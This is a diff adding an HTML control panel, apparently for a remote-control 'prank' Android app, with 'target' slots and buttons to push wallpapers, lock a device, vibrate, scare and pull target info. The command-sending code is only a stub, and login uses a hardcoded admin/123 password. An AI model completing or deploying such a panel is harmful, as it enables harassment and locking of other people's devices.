@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SURXAT V5 - OWNER PANEL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Creepster&display=swap');
+        body { background: #000; color: #fff; font-family: 'Orbitron', sans-serif; overflow: hidden; margin: 0; }
+        .text-horror { font-family: 'Creepster', cursive; color: #ff0000; text-shadow: 0 0 15px #f00; }
+        #bg-video { position: fixed; inset: 0; min-width: 100%; min-height: 100%; z-index: -1; opacity: 0.3; object-fit: cover; }
+        
+        /* Transition Screen */
+        #login-animation-screen { 
+            display: none; position: fixed; inset: 0; z-index: 10000; background: #000; 
+            flex-direction: column; align-items: center; justify-content: center;
+        }
+        #login-animation-screen video { width: 100%; height: 80%; object-fit: contain; }
+        .welcome-text { font-size: 20px; color: #ff0000; margin-top: -50px; text-align: center; }
+
+        .btn-m { background: rgba(20, 20, 20, 0.8); border: 1px solid #333; border-radius: 12px; padding: 10px; display: flex; flex-direction: column; align-items: center; }
+        .target-slot { padding: 10px; border-radius: 8px; background: #111; font-size: 10px; text-align: center; border: 1px solid #222; transition: 0.3s; }
+        .target-active { background: #7f1d1d; border-color: #f00; box-shadow: 0 0 10px #f00; }
+        
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10002; align-items: center; justify-content: center; padding: 20px; }
+        .box-ui { background: #080808; border: 2px solid #f00; padding: 25px; border-radius: 25px; width: 100%; max-width: 350px; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <video autoplay muted loop id="bg-video"><source src="download (1).mp4" type="video/mp4"></video>
+
+    <div id="login-box" class="fixed inset-0 z-[9999] bg-black flex items-center justify-center p-8 text-center">
+        <div class="w-full max-w-sm">
+            <h1 class="text-4xl text-horror mb-8">SURXAT OWNER</h1>
+            <input type="text" id="user" placeholder="USERNAME" class="w-full p-4 bg-zinc-900 border border-red-900 rounded-xl mb-3 text-center text-white outline-none">
+            <input type="password" id="pass" placeholder="PASSWORD" class="w-full p-4 bg-zinc-900 border border-red-900 rounded-xl mb-6 text-center text-white outline-none">
+            
+            <button onclick="doLogin()" class="w-full py-4 bg-red-700 rounded-xl font-black text-xs uppercase tracking-widest">Login Access</button>
+        </div>
+    </div>
+
+    <div id="login-animation-screen">
+        <video id="login-video" playsinline><source src="Skull.mp4" type="video/mp4"></video>
+        <div class="welcome-text text-horror">WELCOME TO APK BY DENIS</div>
+    </div>
+
+    <div id="dashboard" class="hidden h-screen flex flex-col relative z-10">
+        <header class="p-4 border-b border-red-900 bg-black/95 flex justify-between items-center">
+            <span class="text-horror text-xl">DENIS CONTROL</span>
+            <div class="flex items-center gap-3">
+                <div class="bg-zinc-900 px-3 py-1 rounded border border-red-900">
+                    <span class="text-[8px] text-zinc-500 block">PAIRING CODE</span>
+                    <span id="current-pairing-code" class="text-xs text-red-500 font-bold tracking-widest">----</span>
+                </div>
+                <button onclick="generateNewCode()" class="text-red-600 p-2"><i class="fas fa-sync-alt"></i></button>
+            </div>
+        </header>
+
+        <div class="p-4 grid grid-cols-5 gap-2 bg-zinc-950/80 border-b border-red-900">
+            <button onclick="switchTarget(1)" id="t1" class="target-slot target-active">T1</button>
+            <button onclick="switchTarget(2)" id="t2" class="target-slot">T2</button>
+            <button onclick="switchTarget(3)" id="t3" class="target-slot">T3</button>
+            <button onclick="switchTarget(4)" id="t4" class="target-slot">T4</button>
+            <button onclick="switchTarget(5)" id="t5" class="target-slot">T5</button>
+        </div>
+
+        <div class="p-6 flex-1 overflow-y-auto">
+            <div class="grid grid-cols-3 gap-4">
+                <button onclick="openModal('wp-modal')" class="btn-m"><i class="fas fa-image text-red-600 mb-2"></i><span class="text-[10px]">Wallpaper</span></button>
+                
+                <button onclick="openModal('lock-modal')" class="btn-m"><i class="fas fa-user-lock text-yellow-600 mb-2"></i><span class="text-[10px]">Lock Dev</span></button>
+                <button onclick="sendCmd('sos')" class="btn-m border-red-700 bg-red-950/20"><i class="fas fa-biohazard text-red-600 mb-2"></i><span class="text-[10px]">SOS</span></button>
+                
+                <button onclick="sendCmd('scare')" class="btn-m"><i class="fas fa-ghost text-zinc-400 mb-2"></i><span class="text-[10px]">Scare</span></button>
+                <button onclick="sendCmd('vibrate')" class="btn-m"><i class="fas fa-mobile-alt text-zinc-400 mb-2"></i><span class="text-[10px]">Vibrate</span></button>
+                <button onclick="sendCmd('info')" class="btn-m"><i class="fas fa-info-circle text-zinc-400 mb-2"></i><span class="text-[10px]">Target Info</span></button>
+            </div>
+        </div>
+    </div>
+
+    <div id="wp-modal" class="modal-overlay">
+        <div class="box-ui">
+            <h2 class="text-horror text-2xl mb-6">WP DASHBOARD</h2>
+            <button onclick="sendCmd('play_wallpaper')" class="w-full py-4 bg-zinc-900 border border-zinc-700 rounded-xl mb-3 flex items-center justify-between px-6">
+                <span class="text-[10px] font-bold">1. PLAY WALLPAPER</span>
+                <i class="fas fa-play text-red-600"></i>
+            </button>
+            <button onclick="document.getElementById('wp-file').click()" class="w-full py-4 bg-zinc-900 border border-zinc-700 rounded-xl flex items-center justify-between px-6">
+                <span class="text-[10px] font-bold">2. SEND WALLPAPER</span>
+                <i class="fas fa-upload text-red-600"></i>
+            </button>
+            <input type="file" id="wp-file" class="hidden" accept="image/*" onchange="handleWP(this)">
+            <button onclick="closeModal('wp-modal')" class="mt-6 text-[10px] text-zinc-500 uppercase">Back</button>
+        </div>
+    </div>
+
+    <script>
+        let peer, currentTarget = 1, activePairCode = "";
+
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+
+        function doLogin() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            if(u === "admin" && p === "123") {
+                document.getElementById('login-box').style.display = 'none';
+                const animScreen = document.getElementById('login-animation-screen');
+                const vid = document.getElementById('login-video');
+                
+                animScreen.style.display = 'flex';
+                vid.play();
+
+                setTimeout(() => {
+                    animScreen.style.display = 'none';
+                    document.getElementById('dashboard').classList.remove('hidden');
+                    generateNewCode(); // Generate otomatis saat pertama masuk dashboard
+                }, 6000);
+            } else { alert("User/Pass Salah!"); }
+        }
+
+        function generateNewCode() {
+            activePairCode = Math.floor(1000 + Math.random() * 9000).toString();
+            document.getElementById('current-pairing-code').innerText = activePairCode;
+            
+            // Re-inisialisasi PeerJS dengan kode baru
+            if(peer) peer.destroy();
+            peer = new Peer(`DENIS-OWNER-${activePairCode}`);
+            alert("Kode Pairing Baru: " + activePairCode);
+        }
+
+        function switchTarget(id) {
+            currentTarget = id;
+            document.querySelectorAll('.target-slot').forEach(el => el.classList.remove('target-active'));
+            document.getElementById(`t${id}`).classList.add('target-active');
+        }
+
+        function handleWP(input) {
+            if (input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = (e) => sendCmd('update_wallpaper', e.target.result);
+                reader.readAsDataURL(input.files[0]);
+                closeModal('wp-modal');
+            }
+        }
+
+        function sendCmd(cmd, data = "") {
+            console.log(`Sending ${cmd} to Target ${currentTarget} using code ${activePairCode}`);
+            // Logika PeerJS Connection di sini
+        }
+    </script>
+</body>
+</html>
